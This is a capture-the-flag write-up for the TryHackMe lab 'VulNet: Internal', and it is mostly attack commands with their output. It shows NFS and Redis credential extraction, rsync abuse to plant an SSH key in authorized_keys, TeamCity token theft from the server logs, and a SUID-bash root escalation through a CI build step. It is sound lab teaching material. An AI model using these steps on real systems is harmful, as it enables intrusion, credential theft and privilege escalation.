# [THM] VulNet: Internal — Write-up
<img width="1144" height="644" alt="1774979760428" src="https://github.com/user-attachments/assets/fcb9a6eb-fab4-4a6e-94a2-2fd777190e5a" />

## 🎯 Room Overview

* **Target:** `vulnet.thm`
* **Difficulty:** Medium
* **Objective:** Comprehensive enumeration and responsible exploitation targeting NFS, Redis, Rsync, and internal CI/CD infrastructure (TeamCity).
* **Skills Covered:** Service Enumeration, Credential Leakage, SSH Key Injection, Port Forwarding, SUID Abuse.

---

## 🔍 Phase 1: Enumeration & Reconnaissance

### Initial Nmap Scan

To establish the target's attack surface, a full TCP port scan was executed with service versioning, default scripts, and OS detection enabled.

```bash
nmap -p- -sS -sC -sV -O -T4 --min-rate 500 vulnet.thm -oN full.txt -vv

```

### Flag Breakdown

| Flag | Purpose |
| --- | --- |
| `-p-` | Scans all 65,535 TCP ports to ensure non-standard ports aren't missed. |
| `-sS` | Performs a SYN stealth scan without completing full TCP handshakes. |
| `-sC` | Executes Nmap's default NSE scripts for banner grabbing and known misconfigurations. |
| `-sV` | Probes open ports to determine exact service software versions. |
| `-O` | Attempts OS fingerprinting based on network stack responses. |
| `-T4` | Sets an aggressive timing template for faster execution in lab environments. |
| `--min-rate 500` | Forces Nmap to maintain a minimum execution speed of 500 packets/sec. |
| `-oN` | Saves results in normal format to `full.txt` for future reference. |
| `-vv` | Increases verbosity level, outputting open ports in real-time. |

### Scan Results

```text
PORT      STATE     SERVICE     REASON          VERSION
22/tcp    open      ssh         syn-ack ttl 62  OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 56:3a:00:62:b1:f6:e6:f0:a6:0f:5c:0a:3f:ff:00:63 (RSA)
|   256 2d:68:41:3a:96:89:40:bd:f9:7b:61:75:aa:07:45:01 (ECDSA)
|_  256 7b:bd:5d:a9:eb:7e:81:5b:4e:52:ca:ce:15:a0:19:90 (ED25519)
111/tcp   open      rpcbind     syn-ack ttl 62  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3       58515/tcp  mountd
139/tcp   open      netbios-ssn syn-ack ttl 62  Samba smbd 4
445/tcp   open      netbios-ssn syn-ack ttl 62  Samba smbd 4
873/tcp   open      rsync       syn-ack ttl 62  (protocol version 31)
2049/tcp  open      nfs         syn-ack ttl 62  3-4 (RPC #100003)
6379/tcp  open      redis       syn-ack ttl 62  Redis key-value store
9090/tcp  filtered  zeus-admin  no-response
43057/tcp open      java-rmi    syn-ack ttl 62  Java RMI
46079/tcp open      nlockmgr    syn-ack ttl 62  1-4 (RPC #100021)
49739/tcp open      mountd      syn-ack ttl 62  1-3 (RPC #100005)
58101/tcp open      mountd      syn-ack ttl 62  1-3 (RPC #100005)
58515/tcp open      mountd      syn-ack ttl 62  1-3 (RPC #100005)

```

> **Attack Surface Analysis:** The target displays a wide exposure vector. Prominent targets include Samba (`445`), NFS (`2049`), Rsync (`873`), and an unauthenticated-leaning Redis deployment (`6379`).

---

## 🗺️ Phase 2: Enumeration Spree & Dead Ends

### 1. Samba Share Assessment (Null Session)

Using `NetExec` to audit SMB shares for anonymous access:

```bash
nxc smb vulnet.thm -u '' -p '' --shares

```

Null session profiling worked. Accessing the identified public share via guest login:

```bash
smbclient //vulnet.thm/shares -U "guest"%"

```

Navigating the share revealed two paths: `temp/` and `data/`.

* Downloaded files: `services.txt` (contained **Flag 1**), `data.txt`, and `business-req.txt`.
* **Verdict:** Aside from the passive flag, no functional credentials or access vectors were discovered here.

### 2. Redis Auditing (`6379`)

Attempted direct network authentication:

```bash
redis-cli -h vulnet.thm

```

* **Result:** `(error) NOAUTH Authentication required.` Redis access blocked via network-level authentication.

### 3. Rsync Probing (`873`)

Inspecting remote directories via exposed modules:

```bash
rsync --list-only vulnet.thm::

```

* **Result:** Discovered a module called `files`, but connection required authentication. Dead end without valid credentials.

### 4. Java RMI (`43057`)

Utilized `remote-method-guesser` compiled from source via Maven to check for deserialization vulnerabilities:

```bash
java -jar rmg.jar enum vulnet.thm 43057

```

* **Result:** Port is not an RMI registry, has `JEP290` protection active. No exploitable vulnerabilities found.

---

## 🔓 Phase 3: Initial Access Vector

### NFS Share Exploitation

Running `rpcinfo` and `showmount` against the server:

```bash
showmount -e vulnet.thm

```

* **Discovery:** The directory `/opt/conf` is exported to anyone (`*`).

#### Mounting the share locally:

```bash
mkdir /mnt/nfs_loot
sudo mount -t nfs vulnet.thm:/opt/conf /mnt/nfs_loot -o nolock

```

Browsing into `/mnt/nfs_loot/redis/redis.conf`, I isolated the internal authentication string:

```bash
grep "requirepass" /mnt/nfs_loot/redis/redis.conf

```

* **Loot:** Extracted plaintext Redis password.

### Pivoting to Redis & Credential Extraction

With the password secured, authenticated access to the database was completed successfully:

```bash
redis-cli -h vulnet.thm -a <PASSWORD>

```

```text
127.0.0.1:6379> keys *
1) "internal flag"
2) "authlist"
...
127.0.0.1:6379> get "internal flag"
[REDACTED_INTERNAL_FLAG]

```

> **Note:** Handling keys with spaces required enclosing strings within literal quotes `""` inside the `redis-cli` context due to parsing mechanics in this specific software layout.

Reading the `authlist` structure revealed an array of Base64 encoded values. Decoding them yielded credentials for the Rsync service:

```bash
echo "Y29tcGFjdF9iYXNlNjRfc3RyaW5n..." | base64 -d

```

* **Extracted Identity:** `rsync-connect : <PASSWORD>`

### Exploiting Rsync for Foothold

Using the extracted credentials to check the `files` module:

```bash
rsync -avz rsync-connect@vulnet.thm::files ./rsync_loot

```

The download successfully extracted the home profile directory of user `sys-internal`, revealing **Flag 2 (User Flag)**.

#### SSH Key Injection Persistence

Since write permissions were active on the user directory via Rsync, an arbitrary SSH authentication key injection was executed:

```bash
# Generate localized temporary deployment key pairs
ssh-keygen -f id_rsa_temp

# Append public key structure into target's authorized_keys infrastructure
rsync -avz id_rsa_temp.pub rsync-connect@vulnet.thm::files/sys-internal/.ssh/authorized_keys

```

Establishing access via SSH utilizing the injected credential:

```bash
ssh -i id_rsa_temp sys-internal@vulnet.thm

```

**Foothold secured with a highly stable SSH shell session.**

---

## 🚀 Phase 4: Privilege Escalation

### Local Enumeration

A manual analysis of active directory topologies at root level highlighted an internal deployment framework: `/TeamCity`.

Checking internal port bindings:

```bash
ss -tno

```

* **Discovery:** Port `8111` is running locally, tied strictly to `127.0.0.1` (JetBrains TeamCity instance).

### Port Forwarding

To access the web service from the attacking workstation, an local SSH port forward tunnel was initialized:

```bash
ssh -L 8111:127.0.0.1:8111 -i id_rsa_temp sys-internal@vulnet.thm

```

To gain administrator access, the instance's log structure was parsed to extract the automated super user authorization token:

```bash
grep -i "Super user token" /TeamCity/logs/teamcity-server.log

```

### Abusing the CI/CD Pipeline (Root RCE)

1. Authenticated to `http://localhost:8111` using the extracted super-user token.
2. Initialized a generic boilerplate project build chain configuration.
3. Added a new build compilation configuration phase selecting **Command Line** as the operational execution engine.

Since the backing daemon worker for TeamCity was running within a `root` daemon security context, any compilation block instruction would inherit full system authority.

#### Payload Configured:

```bash
chmod u+s /bin/bash

```

4. Triggered a manual execution build flow step via the UI panel.

### Spawning the Root Shell

Once the build completion logs confirmed execution, the local SUID execution bit manipulation on `/bin/bash` was completed.

```bash
bash -p

```

```text
whoami
root
cat /root/root.txt
[REDACTED_ROOT_FLAG]

```

---

## 📝 Conclusion & Key Takeaways

`VulNet: Internal` served as an exceptional demonstration of the operational synergy between distinct misconfigured elements within corporate assets:

1. **Implicit Trust In File Shares:** NFS exposed internal configuration parameters which breached independent datastore authentication rings.
2. **Horizontal Credential Reuse:** Retaining base64 components within in-memory caches led directly to complete Rsync manipulation vectors.
3. **Internal Pipeline Hardening Failures:** Running critical continuous deployment applications like JetBrains TeamCity directly under `root` scopes allows severe compromise mechanics to occur if access control configurations fail.
